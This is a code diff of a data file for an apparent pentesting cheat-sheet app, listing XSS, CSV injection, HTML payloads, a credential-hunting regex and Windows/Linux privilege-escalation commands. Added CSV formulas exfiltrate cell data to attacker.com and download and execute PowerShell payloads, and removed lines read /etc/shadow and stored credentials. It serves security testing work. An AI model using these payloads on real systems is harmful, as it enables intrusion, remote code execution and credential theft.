@@ -36,7 +36,7 @@ const wordlistsData = [
         name: "SQL Authentication Payloads",
         description: "Comprehensive wordlist of SQL authentication bypass payloads",
         link: "https://raw.githubusercontent.com/Jaikumar3/Wordlists/refs/heads/main/Sql%20auth%20Payloads"
-    } 
+    }
 ];
 
 // XSS Payloads data organized by categories (based on PortSwigger's XSS Cheat Sheet)
@@ -423,7 +423,6 @@ const xssData = {
             browser: "All browsers"
         }
     ],
-    // New HTML-specific payloads
     htmlSpecific: [
         {
             payload: "<form><button formaction=javascript:alert(1)>XSS</button></form>",
@@ -474,7 +473,6 @@ const xssData = {
             description: "Legacy isindex tag XSS (obsolete but still works in some browsers)"
         }
     ],
-    // New Angular-specific payloads
     angularPayloads: [
         {
             payload: "{{constructor.constructor('alert(1)')()}}",
@@ -534,6 +532,246 @@ const xssData = {
         }
     ]
 };
+
+// Regex Patterns data
+const regexData = [
+    {
+        pattern: "^([a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,6})*$",
+        description: "Email address validation"
+    },
+    {
+        pattern: "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",
+        description: "IPv4 address validation"
+    },
+    {
+        pattern: "^(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$",
+        description: "MAC address validation"
+    },
+    {
+        pattern: "^(?:https?:\\/\\/)?(?:www\\.)?[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}(?:\\/[\\w\\-._~:/?#[\\]@!$&'()*+,;=]*)?$",
+        description: "URL validation"
+    },
+    {
+        pattern: "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$",
+        description: "Strong password validation"
+    },
+    {
+        pattern: "(?:[^<]*)<([^>]*)>(?:[^<]*)<\\/\\1>(?:[^<]*)",
+        description: "Match HTML tags"
+    },
+    {
+        pattern: "(?:\\d{1,3}\\.){3}\\d{1,3}(?=\\D|$)",
+        description: "Find IP addresses in text"
+    },
+    {
+        pattern: "\\b(?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2})\\b",
+        description: "Find MAC addresses in text"
+    },
+    {
+        pattern: "((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\\-,]{0,25})(=|>|:=|\\|\\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\\-_=]{8,64})['\"]",
+        description: "Find sensitive API keys, tokens, passwords and credentials in Burp Suite"
+    }
+];
+
+// External Resources data
+const resourcesData = [
+    {
+        name: "PayloadsAllTheThings",
+        description: "A list of useful payloads and bypass for Web Application Security",
+        link: "https://github.com/swisskyrepo/PayloadsAllTheThings"
+    },
+    {
+        name: "OWASP Cheat Sheet Series",
+        description: "Collection of high value information on specific application security topics",
+        link: "https://cheatsheetseries.owasp.org/"
+    },
+    {
+        name: "HackTricks",
+        description: "Comprehensive hacking techniques and tips",
+        link: "https://book.hacktricks.xyz/"
+    },
+    {
+        name: "Pentester's Lab",
+        description: "Hands-on labs for security testing practice",
+        link: "https://pentesterlab.com/"
+    },
+    {
+        name: "PortSwigger Web Security Academy",
+        description: "Free online training for web security testing",
+        link: "https://portswigger.net/web-security"
+    },
+    {
+        name:"Exploit Notes",
+        description: "A collection of notes and resources for various exploits",
+        link: "https://exploit-notes.hdks.org/"
+    }
+];
+
+// HTML payloads data
+const htmlPayloadsData = [
+    {
+        payload: "<marquee>Scrolling Text</marquee>",
+        description: "Scrolling text element (deprecated but still works in most browsers)"
+    },
+    {
+        payload: "<blink>Blinking Text</blink>",
+        description: "Blinking text element (deprecated but may still work in some browsers)"
+    },
+    {
+        payload: "<details><summary>Click to expand</summary><p>Hidden content here</p></details>",
+        description: "Expandable details element with summary"
+    },
+    {
+        payload: "<input type=\"text\" list=\"suggestions\"><datalist id=\"suggestions\"><option value=\"Option 1\"><option value=\"Option 2\"></datalist>",
+        description: "Input with datalist for autocomplete suggestions"
+    },
+    {
+        payload: "<meter min=\"0\" max=\"100\" value=\"75\">75%</meter>",
+        description: "Meter element for displaying a gauge"
+    },
+    {
+        payload: "<progress value=\"70\" max=\"100\">70%</progress>",
+        description: "Progress bar element"
+    },
+    {
+        payload: "<dialog open>This is a dialog box</dialog>",
+        description: "Dialog element for modal content"
+    },
+    {
+        payload: "<ruby>漢<rt>かん</rt>字<rt>じ</rt></ruby>",
+        description: "Ruby annotations for East Asian typography"
+    }
+];
+
+// Windows privilege escalation data
+const windowsPrivescData = [
+    {
+        payload: "whoami /all",
+        description: "Check current user privileges and groups"
+    },
+    {
+        payload: "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
+        description: "Get OS information"
+    },
+    {
+        payload: "wmic qfe get Caption,Description,HotFixID,InstalledOn",
+        description: "List installed patches"
+    },
+    {
+        payload: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\"",
+        description: "Find non-standard Windows services"
+    },
+    {
+        payload: "wmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i \"auto\"",
+        description: "Find services with unquoted paths"
+    },
+    {
+        payload: "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
+        description: "Find services that Authenticated Users can modify"
+    },
+    {
+        payload: "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+        description: "Check for AlwaysInstallElevated registry key"
+    },
+    {
+        payload: "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
+        description: "Check for autorun executables in HKCU"
+    }
+];
+
+// Windows privilege escalation resources
+const windowsPrivescResourcesData = [
+    {
+        name: "LOLBAS",
+        description: "Living Off The Land Binaries, Scripts and Libraries",
+        link: "https://lolbas-project.github.io/"
+    },
+    {
+        name: "Windows Privilege Escalation Fundamentals",
+        description: "Comprehensive guide on Windows privesc techniques",
+        link: "https://www.fuzzysecurity.com/tutorials/16.html"
+    },
+    {
+        name: "PowerUp.ps1",
+        description: "PowerShell script for Windows privilege escalation",
+        link: "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"
+    },
+    {
+        name: "Watson",
+        description: "Enumerate missing KBs and suggest exploits for privilege escalation",
+        link: "https://github.com/rasta-mouse/Watson"
+    },
+    {
+        name: "Windows Exploit Suggester",
+        description: "Tool to suggest exploits based on missing patches",
+        link: "https://github.com/AonCyberLabs/Windows-Exploit-Suggester"
+    }
+];
+
+// Linux privilege escalation data
+const linuxPrivescData = [
+    {
+        payload: "find / -perm -u=s -type f 2>/dev/null",
+        description: "Find SUID executables"
+    },
+    {
+        payload: "find / -perm -g=s -type f 2>/dev/null",
+        description: "Find SGID executables"
+    },
+    {
+        payload: "find / -writable -type d 2>/dev/null",
+        description: "Find world-writable directories"
+    },
+    {
+        payload: "find / -writable -type f -not -path \"/proc/*\" 2>/dev/null",
+        description: "Find world-writable files"
+    },
+    {
+        payload: "sudo -l",
+        description: "List commands the current user can run with sudo"
+    },
+    {
+        payload: "cat /etc/crontab",
+        description: "Check system-wide cron jobs"
+    },
+    {
+        payload: "ls -la /etc/cron.*",
+        description: "Check cron job directories"
+    },
+    {
+        payload: "cat /etc/passwd | grep -v nologin",
+        description: "Find users with login shells"
+    }
+];
+
+// Linux privilege escalation resources
+const linuxPrivescResourcesData = [
+    {
+        name: "GTFOBins",
+        description: "Curated list of Unix binaries that can be used to bypass security restrictions",
+        link: "https://gtfobins.github.io/"
+    },
+    {
+        name: "LinPEAS",
+        description: "Linux Privilege Escalation Awesome Script",
+        link: "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"
+    },
+    {
+        name: "Linux Exploit Suggester 2",
+        description: "Tool to identify potential Linux kernel exploits",
+        link: "https://github.com/jondonas/linux-exploit-suggester-2"
+    },
+    {
+        name: "LinEnum",
+        description: "Scripted Local Linux Enumeration & Privilege Escalation Checks",
+        link: "https://github.com/rebootuser/LinEnum"
+    },
+    {
+        name: "Linux Smart Enumeration",
+        description: "Linux enumeration tool for penetration testers",
+        link: "https://github.com/diego-treitos/linux-smart-enumeration"
+    }
+];
 
 // LFI Payloads data
 const lfiData = [
@@ -643,419 +881,54 @@ const sqlInjectionData = [
     }
 ];
 
-// Regex Patterns data
-const regexData = [
+// CSV Injection Payloads data
+const csvInjectionData = [
     {
-        pattern: "^([a-zA-Z0-9._%-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,6})*$",
-        description: "Email address validation"
+        payload: "=cmd|' /C calc'!A1",
+        description: "Excel formula to launch calculator via command prompt"
     },
     {
-        pattern: "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",
-        description: "IPv4 address validation"
+        payload: "=DDE(\"cmd\";\"calc\";\"\")",
+        description: "Dynamic Data Exchange (DDE) formula to execute calculator"
     },
     {
-        pattern: "^(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$",
-        description: "MAC address validation"
+        payload: "@SUM(1+1)*cmd|' /C calc'!A0",
+        description: "Excel formula with arithmetic operation to trigger command execution"
     },
     {
-        pattern: "^(?:https?:\\/\\/)?(?:www\\.)?[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}(?:\\/[\\w\\-._~:/?#[\\]@!$&'()*+,;=]*)?$",
-        description: "URL validation"
+        payload: "+IMPORTXML(CONCAT(\"//\",'google',\".com\"),\"//a\")",
+        description: "Google Sheets formula that leaks data via DNS"
     },
     {
-        pattern: "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$",
-        description: "Strong password validation"
+        payload: "=HYPERLINK(\"data:text/html,<script>alert(1)</script>\",\"Click Me\")",
+        description: "CSV cell that creates a malicious hyperlink"
     },
     {
-        pattern: "(?:[^<]*)<([^>]*)>(?:[^<]*)<\\/\\1>(?:[^<]*)",
-        description: "Match HTML tags"
+        payload: "=WEBSERVICE(\"https://attacker.com/?\"&A1)",
+        description: "Excel formula to exfiltrate data to external website"
     },
     {
-        pattern: "(?:\\d{1,3}\\.){3}\\d{1,3}(?=\\D|$)",
-        description: "Find IP addresses in text"
+        payload: "=cmd|' /C powershell IEX(New-Object Net.WebClient).downloadString(\\\"http://attacker.com/shell.ps1\\\")'!A0",
+        description: "Excel formula to download and execute PowerShell payload"
     },
     {
-        pattern: "\\b(?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2})\\b",
-        description: "Find MAC addresses in text"
-    }
-];
-
-// External Resources data
-const resourcesData = [
-    {
-        name: "PayloadsAllTheThings",
-        description: "A list of useful payloads and bypass for Web Application Security",
-        link: "https://github.com/swisskyrepo/PayloadsAllTheThings"
-    },
-    {
-        name: "OWASP Cheat Sheet Series",
-        description: "Collection of high value information on specific application security topics",
-        link: "https://cheatsheetseries.owasp.org/"
-    },
-    {
-        name: "HackTricks",
-        description: "Comprehensive hacking techniques and tips",
-        link: "https://book.hacktricks.xyz/"
-    },
-    {
-        name: "Pentester's Lab",
-        description: "Hands-on labs for security testing practice",
-        link: "https://pentesterlab.com/"
-    },
-    {
-        name: "PortSwigger Web Security Academy",
-        description: "Free online training for web security testing",
-        link: "https://portswigger.net/web-security"
-    },
-    {
-        name: "Exploit Database",
-        description: "Archive of exploits and vulnerable software",
-        link: "https://www.exploit-db.com/"
-    }
-];
-
-// HTML Payloads data (separate from XSS)
-const htmlPayloadsData = [
-    {
-        payload: "<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">",
-        description: "Meta refresh redirect to external site"
-    },
-    {
-        payload: "<iframe src=\"http://evil.com\" width=\"800\" height=\"600\"></iframe>",
-        description: "Basic iframe to load external content"
-    },
-    {
-        payload: "<marquee behavior=\"alternate\" direction=\"left\" scrollamount=\"10\">Scrolling Text</marquee>",
-        description: "Marquee element for scrolling text"
-    },
-    {
-        payload: "<blink>Blinking text</blink>",
-        description: "Blink element (deprecated)"
-    },
-    {
-        payload: "<base href=\"http://evil.com/\">",
-        description: "Base tag to modify relative URL resolution"
-    },
-    {
-        payload: "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" type=\"text/html\"></object>",
-        description: "Object with data URI containing Base64 encoded HTML"
-    },
-    {
-        payload: "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" type=\"text/html\">",
-        description: "Embed with data URI containing Base64 encoded HTML"
-    },
-    {
-        payload: "<video autoplay><source src=\"http://evil.com/video.mp4\" type=\"video/mp4\"></video>",
-        description: "Autoplaying video element"
-    },
-    {
-        payload: "<audio autoplay loop><source src=\"http://evil.com/audio.mp3\" type=\"audio/mpeg\"></audio>",
-        description: "Autoplaying audio element"
-    },
-    {
-        payload: "<link rel=\"import\" href=\"http://evil.com/page.html\">",
-        description: "HTML imports (deprecated feature)"
-    },
-    {
-        payload: "<details open><summary>Details Title</summary>Content that is shown when open.</details>",
-        description: "Details/summary elements for expandable content"
-    },
-    {
-        payload: "<template id=\"template\"><div>Template content</div></template>",
-        description: "HTML template element"
-    },
-    {
-        payload: "<picture><source srcset=\"http://evil.com/img.webp\" type=\"image/webp\"><img src=\"fallback.jpg\"></picture>",
-        description: "Picture element with multiple sources"
-    },
-    {
-        payload: "<portal src=\"http://evil.com/\"></portal>",
-        description: "Portal element (experimental)"
-    },
-    {
-        payload: "<math><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow></math>",
-        description: "MathML for mathematical formulas"
-    },
-    {
-        payload: "<svg width=\"100\" height=\"100\"><circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"2\" fill=\"red\"/></svg>",
-        description: "SVG inline graphics"
-    },
-    {
-        payload: "<form action=\"http://evil.com/log.php\" method=\"POST\"><input type=\"hidden\" name=\"stolen\" value=\"data\"><input type=\"submit\"></form>",
-        description: "Form with hidden input"
-    },
-    {
-        payload: "<input type=\"file\" accept=\"image/*\" capture=\"camera\">",
-        description: "File input with camera capture"
-    }
-];
-
-// Windows Privilege Escalation data
-const windowsPrivescData = [
-    {
-        payload: "whoami /priv",
-        description: "Display the security privileges of the current user"
-    },
-    {
-        payload: "whoami /groups",
-        description: "Display group membership of the current user"
-    },
-    {
-        payload: "net user %username%",
-        description: "Display information about the current user account"
-    },
-    {
-        payload: "net localgroup administrators",
-        description: "List members of the local administrators group"
-    },
-    {
-        payload: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\"",
-        description: "Find services with unquoted paths that might be exploitable"
-    },
-    {
-        payload: "wmic service get name,displayname,startmode,pathname | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\system32\"",
-        description: "Alternative to find services with unquoted paths"
-    },
-    {
-        payload: "icacls \"C:\\Program Files\\*\" | findstr \"BUILTIN\\Users:(F)\" | findstr \":(F)\"",
-        description: "Check for write permissions in Program Files"
-    },
-    {
-        payload: "icacls \"C:\\Program Files (x86)\\*\" | findstr \"BUILTIN\\Users:(F)\" | findstr \":(F)\"",
-        description: "Check for write permissions in Program Files (x86)"
-    },
-    {
-        payload: "schtasks /query /fo LIST /v",
-        description: "List all scheduled tasks on the system"
-    },
-    {
-        payload: "netsh firewall show state",
-        description: "Show the firewall configuration"
-    },
-    {
-        payload: "netsh firewall show config",
-        description: "Show the firewall configuration details"
-    },
-    {
-        payload: "reg query HKLM /f password /t REG_SZ /s",
-        description: "Search for passwords in the registry"
-    },
-    {
-        payload: "reg query HKCU /f password /t REG_SZ /s",
-        description: "Search for passwords in the current user registry"
-    },
-    {
-        payload: "cmdkey /list",
-        description: "List stored credentials"
-    },
-    {
-        payload: "wmic product get name,version,vendor",
-        description: "List installed applications"
-    },
-    {
-        payload: "systeminfo",
-        description: "Get detailed system information to identify missing patches"
-    },
-    {
-        payload: "wmic qfe get Caption,Description,HotFixID,InstalledOn",
-        description: "List installed patches"
-    },
-    {
-        payload: "dir /s *pass* == *cred* == *vnc* == *.config*",
-        description: "Search for sensitive files"
-    },
-    {
-        payload: "findstr /si password *.xml *.ini *.txt *.config *.bat",
-        description: "Search for passwords in various file types"
-    },
-    {
-        payload: "tasklist /SVC",
-        description: "List running processes and their associated services"
-    }
-];
-
-// Resources specifically for Windows privilege escalation
-const windowsPrivescResourcesData = [
-    {
-        name: "LOLBAS",
-        description: "Living Off The Land Binaries and Scripts - Windows binaries that can be abused",
-        link: "https://lolbas-project.github.io/"
-    },
-    {
-        name: "PayloadsAllTheThings - Windows Privilege Escalation",
-        description: "Comprehensive guide for Windows privilege escalation techniques",
-        link: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md"
-    },
-    {
-        name: "PowerUp.ps1",
-        description: "PowerShell script for Windows privilege escalation enumeration",
-        link: "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"
-    },
-    {
-        name: "WinPEAS",
-        description: "Windows Privilege Escalation Awesome Script",
-        link: "https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS"
-    },
-    {
-        name: "Windows Exploit Suggester - Next Generation",
-        description: "Tool to identify exploits for vulnerable Windows components",
-        link: "https://github.com/bitsadmin/wesng"
-    },
-    {
-        name: "Priv2Admin",
-        description: "Windows Privilege Escalation to Admin tools and techniques",
-        link: "https://github.com/gtworek/Priv2Admin"
-    },
-    {
-        name: "HackTricks - Windows Privilege Escalation",
-        description: "Detailed guide for Windows privilege escalation techniques",
-        link: "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
-    },
-    {
-        name: "WindowsEnum",
-        description: "PowerShell enumeration script for Windows privilege escalation",
-        link: "https://github.com/absolomb/WindowsEnum"
-    },
-    {
-        name: "PrivescCheck",
-        description: "Privilege Escalation Enumeration Script for Windows",
-        link: "https://github.com/itm4n/PrivescCheck"
-    }
-];
-
-// Linux Privilege Escalation data
-const linuxPrivescData = [
-    {
-        payload: "id",
-        description: "Display user and group IDs"
-    },
-    {
-        payload: "uname -a",
-        description: "Print system information"
-    },
-    {
-        payload: "cat /etc/issue; cat /etc/*-release",
-        description: "Show Linux distribution information"
-    },
-    {
-        payload: "cat /proc/version",
-        description: "Display kernel information"
-    },
-    {
-        payload: "hostname",
-        description: "Show system hostname"
-    },
-    {
-        payload: "cat /etc/passwd",
-        description: "List all users on the system"
-    },
-    {
-        payload: "cat /etc/shadow",
-        description: "Try to read shadow password file (requires privileges)"
-    },
-    {
-        payload: "cat /etc/group",
-        description: "List all groups on the system"
-    },
-    {
-        payload: "ls -la /etc/sudoers; sudo -l",
-        description: "Check sudo permissions"
-    },
-    {
-        payload: "find / -perm -u=s -type f 2>/dev/null",
-        description: "Find SUID files"
-    },
-    {
-        payload: "find / -perm -g=s -type f 2>/dev/null",
-        description: "Find SGID files"
-    },
-    {
-        payload: "find / -writable -type d 2>/dev/null",
-        description: "Find world-writeable directories"
-    },
-    {
-        payload: "find / -writable -type f 2>/dev/null",
-        description: "Find world-writeable files"
-    },
-    {
-        payload: "find / -user root -perm -4000 -exec ls -ld {} \\; 2>/dev/null",
-        description: "Find root owned files with SUID bit set"
-    },
-    {
-        payload: "crontab -l; ls -la /etc/cron*",
-        description: "List scheduled cron jobs"
-    },
-    {
-        payload: "ps aux | grep root",
-        description: "Find processes running as root"
-    },
-    {
-        payload: "netstat -tulpn",
-        description: "Show listening ports and associated processes"
-    },
-    {
-        payload: "cat /etc/fstab",
-        description: "Show mounted file systems"
-    },
-    {
-        payload: "find / -name '*.bak' -o -name '*.old' 2>/dev/null",
-        description: "Find backup files"
-    },
-    {
-        payload: "env",
-        description: "Show environment variables"
-    }
-];
-
-// Resources specifically for Linux privilege escalation
-const linuxPrivescResourcesData = [
-    {
-        name: "PayloadsAllTheThings - Linux Privilege Escalation",
-        description: "Comprehensive guide for Linux privilege escalation techniques",
-        link: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md"
-    },
-    {
-        name: "GTFOBins",
-        description: "Unix binaries that can be exploited for privilege escalation",
-        link: "https://gtfobins.github.io/"
-    },
-    {
-        name: "LinPEAS",
-        description: "Linux Privilege Escalation Awesome Script",
-        link: "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"
-    },
-    {
-        name: "Linux Exploit Suggester 2",
-        description: "Tool to identify potential privilege escalation vectors",
-        link: "https://github.com/jondonas/linux-exploit-suggester-2"
-    },
-    {
-        name: "LinEnum",
-        description: "Scripted Local Linux Enumeration & Privilege Escalation Checks",
-        link: "https://github.com/rebootuser/LinEnum"
-    },
-    {
-        name: "pspy",
-        description: "Monitor Linux processes without root permissions",
-        link: "https://github.com/DominicBreuker/pspy"
+        payload: "-1+1|cmd|'/C powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).downloadString(\\\"http://attacker.com/payload\\\")\"'!_xlfn.RANDBETWEEN",
+        description: "Advanced formula for PowerShell execution with bypass"
     },
     {
-        name: "linux-smart-enumeration",
-        description: "Linux enumeration tool for pentesting and CTFs",
-        link: "https://github.com/diego-treitos/linux-smart-enumeration"
+        payload: "=INDIRECT(\"C:\\\\Windows\\\\System32\\\\calc.exe\")",
+        description: "Excel INDIRECT function that can trigger executable"
     },
     {
-        name: "HackTricks - Linux Privilege Escalation",
-        description: "Detailed guide for Linux privilege escalation techniques",
-        link: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
+        payload: "=cmd|'/c echo Vulnerable > C:\\CSV_Vulnerable.txt'!A0",
+        description: "Write text to file using command prompt"
     },
     {
-        name: "Linux Privilege Escalation Checklist",
-        description: "g0tmi1k's Linux Privilege Escalation guide",
-        link: "https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"
+        payload: "=HYPERLINK(\"javascript:alert('XSS')\",\"Click for XSS\")",
+        description: "JavaScript hyperlink that executes when opened"
     },
     {
-        name: "unix-privesc-check",
-        description: "Shell script to check for simple privilege escalation vectors",
-        link: "https://github.com/pentestmonkey/unix-privesc-check"
+        payload: ",=2+5+cmd|' /C calc'!A0,",
+        description: "CSV formula with command execution disguised as calculation"
     }
 ];
